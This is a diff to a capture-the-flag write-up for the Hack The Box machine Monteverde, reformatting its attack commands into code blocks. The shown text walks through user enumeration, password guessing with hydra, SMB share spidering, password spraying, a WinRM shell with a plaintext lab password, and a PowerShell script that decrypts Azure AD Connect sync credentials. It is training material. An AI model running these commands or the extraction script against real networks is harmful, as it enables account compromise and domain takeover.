@@ -64,7 +64,10 @@ We also have **WinRM** open on tcp 5985 which would be handy to get remote code 
 ### Username Enumeration
 *Using a tool called* `enum4linux-ng`, we are able to get a list of usernames via `RPC`:
 
-**Command:** `enum4linx-ng -A 10.10.10.172`
+**Command:** 
+```bash
+enum4linx-ng -A 10.10.10.172
+````
 
 ![enum4linux-ng-output](/assets/Monteverde/enum4linux-ng-output.jpg)
 
@@ -87,7 +90,10 @@ We make a quick list of common passwords to try like 'P@ssw0rd', 'Welcome1' etc.
 
 So we try using the usernames themselves as passwords. We do so using `hydra` and we get a hit!
 
-**Command:** `hydra -e s -L users.txt ldap3://10.10.10.172 -v`
+**Command:** 
+```bash
+hydra -e s -L users.txt ldap3://10.10.10.172 -v
+```
 
 where the `-e` flag with the `s` argument is the part instructing `hydra` to use the same entry for both username and password.
 
@@ -98,7 +104,10 @@ After we verify that `SABatchJobs` doesn't have **WinRM** access, we enumerate *
 
 This module does as the name suggests: it *recursively* spiders **SMB** shares and outputs the results in a temp folder.
 
-**Command:** `crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -M spider_plus`
+**Command:** 
+```bash
+crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -M spider_plus
+```
 
 ![cme-spiderplus](/assets/Monteverde/cme-spiderplus.jpg)
 
@@ -108,7 +117,10 @@ This module does as the name suggests: it *recursively* spiders **SMB** shares a
 
 We connect to the share with `smbclient` and download the file to view its contents:
 
-**Command:** `smbclient //10.10.10.172/users$ -U SABatchJobs`
+**Command:** 
+```bash
+smbclient //10.10.10.172/users$ -U SABatchJobs
+```
 
 and we get a password!
 
@@ -117,7 +129,10 @@ and we get a password!
 ### Shell Access as `mhope`
 *After getting this password,* we immediately spray it over the domain users. We find that it's valid and that we have **WinRM** access as well!
 
-**Command:** `crackmapexec winrm 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success`
+**Command:** 
+```bash
+crackmapexec winrm 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
+```
 
 **Note:** we used the `--continue-on-success` to be able to take advantage of any password reuse.
 
@@ -125,7 +140,10 @@ and we get a password!
 
 We login using `evil-winrm` to get a **PowerShell** session on the box:
 
-**Command:** `evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`
+**Command:** 
+```bash
+evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+```
 
 ![evil-winrm-access](/assets/Monteverde/evil-winrm-access.jpg)
 
@@ -186,7 +204,7 @@ Seems like we do!
 
 we take a look at the first 5 lines:
 
-```
+```powershell
 Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
 
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
@@ -197,7 +215,9 @@ $cmd = $client.CreateCommand()
 
 And start by running the part which defines how the script will connect to the database a.k.a the **"connection string"**.
 
-`$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"`
+```powershell
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+```
 
 which runs okay. Because we're not really taking any action here. Just initializing an object of the type "System.Data.SqlClient.SqlConnection". Nothing more.
 
@@ -232,7 +252,7 @@ Seems that the connection string doesn't use our `mhope` user credentials.
 
 1. Defining the connection string: we're connecting to the **ADSync DB** on the **local computer** using **Windows Authentication**
 
-```
+```powershell
 $connection_string = "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList $connection_string
 $client.Open()
@@ -241,7 +261,7 @@ $cmd = $client.CreateCommand()
 
 2. Querying for the important bits to do the decryption: `keyset_id`, `instance_id` and `entropy` from the `mms_server_configuration` table
 
-```
+```powershell
 $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
 $reader = $cmd.ExecuteReader()
 $reader.Read() | Out-Null
@@ -253,7 +273,7 @@ $reader.Close()
 
 3. Obtaining the configuration items: `private_configuration_xml` and `encrypted_configuration` from the `mms_management_agent` table
 
-```
+```powershell
 $cmd = $client.CreateCommand()
 $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
 $reader = $cmd.ExecuteReader()
@@ -265,7 +285,7 @@ $reader.Close()
 
 4. Loading the `mcrypt.dll` into memory and carrying out the decryption using the keys extracted from **Step #1**
 
-```
+```powershell
 add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
 $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
 $km.LoadKeySet($entropy, $instance_id, $key_id)
@@ -279,7 +299,7 @@ $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
 
 5. Selecting the domain, username and password from the XML-formatted output and printing them to the screen.
 
-```
+```powershell
 $domain   = select-xml -Content $config    -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
 $username = select-xml -Content $config    -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
 $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
